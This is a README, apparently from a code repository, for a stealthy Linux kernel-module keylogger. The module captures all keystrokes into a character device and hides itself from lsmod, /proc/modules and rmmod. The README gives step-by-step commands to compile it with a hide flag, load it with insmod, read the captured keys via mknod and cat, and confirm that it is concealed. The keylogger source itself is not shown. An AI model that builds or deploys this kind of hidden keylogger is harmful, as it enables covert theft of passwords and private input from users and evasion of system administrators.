# C-Keylog-Kernel-Module by ANUJ SINGH KUSHWAHA
Keylogger is a stealthy linux kernel-based module. It is a loadable kernel module that hides itself from 'lsmod' command and /proc/modules.


It captures the keystrokes of the keyboard and outputs to a character device
driver. Using the 'rmmod' command, an error is displayed showing no such
module is running in the kernel. To remove the keylogger module, 'make clean'
command can be used.



DEPENDENCIES/TOOLS USED
1. VM VirtualBox Machine
2. Linux OS LTS 20.04 (Kernel Version: 5.11.0-43-generic)
3. GNU Make 4.2.1


NOTE: 
1. Save keylog code file as keylog.c
2. Save makefile as 'Makefile'
3. Inside Makefile, before make cmd there is a single tab NOT spaces

Steps to run----------
1.  1. Compiling keylog.c file using make cmd and _DHIDE_MODULE,
changing buffer size BUFLEN(storing key events). By default, it’s 1024
bytes.
            KCPPFLAGS="-DHIDE_MODULE -DBUFLEN=2048" make

2.  type and run cmd  ls
3.  insert module using sudo insmod keylog.ko
4.  check if hidden or not using
     lsmod | grep 'keylog.ko'
5.  get the major number using dmesg | tail -n1
6.  create a file to store the keylogs using sudo mknod newfile c <major num found using prev cmd> 0
7.  fetch file using cat newfile
8.  try removing mu=odule using rmmod keylog.ko
9. NO SUCH MODULE FOUND, right --- cuz hidden
10. use make clean cmd to remove and clean the built modules
